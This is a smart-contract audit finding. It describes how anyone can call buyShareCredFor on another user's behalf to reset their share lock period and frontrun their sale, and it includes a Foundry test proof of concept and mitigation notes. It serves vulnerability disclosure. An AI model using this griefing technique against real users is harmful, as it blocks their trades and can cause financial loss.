# Vulnerability details

## Impact
There is a `SHARE_LOCK_PERIOD` in which users cannot sell shares. This is updated whenever a share is bought for him. 
The problem is that Bob for example wants to sell his share at a particular time and then Alice frontrun him by buying a share for Bob. 
This will update Bob's `lastTradeTimestamp`, preventing him from selling.

Inability for a user to sell share/shares at moment, causing a possible profit loss

## Proof of Concept
Add the following test at the bottom inside `Cred.t.sol`

```javascript
function test_userUnableToSellAfterSomeoneBuysForHim() public {
    _createCred("BASIC", "SIGNATURE", 0x0);

    uint256 credId = cred.credIdCounter() - 1;
    uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(credId, 1, 1);

    address bob = makeAddr("bob");
    vm.deal(bob, buyPrice);
    vm.startPrank(bob);

    /* Bob buys a share for himself */
    cred.buyShareCred{ value: buyPrice }(credId, 1, 0);
    assertEq(cred.isShareHolder(1, bob), true, "Bob owns cred 1");

    /* SHARE_LOCK_PERIOD is passed and now Bob wants to sell his share */
    vm.warp(block.timestamp + cred.SHARE_LOCK_PERIOD() + 1);

    /* Alise buys for Bob and prevents him from selling */
    address alice = makeAddr("alice");

    buyPrice = bondingCurve.getBuyPriceAfterFee(credId, 2, 1);
    vm.deal(alice, buyPrice);
    vm.startPrank(alice);
    cred.buyShareCredFor{ value: buyPrice }(credId, 1, bob, 0);

    /* Bob tries to sell his share */
    vm.startPrank(bob);
    vm.expectRevert();
    cred.sellShareCred(credId, 1, 0);

    assertEq(cred.isShareHolder(1, bob), true, "Bob still owns cred 1");
}
```

## Recommended Mitigation Steps
This is a topic about the design because if the `lastTradeTimestamp` is not updated on
`buyShareCredFor`, a user may buy a share for himself with other addresses and bypass the `SHARE_LOCK_PERIOD`.
Reconsider the purpose of the `SHARE_LOCK_PERIOD`.
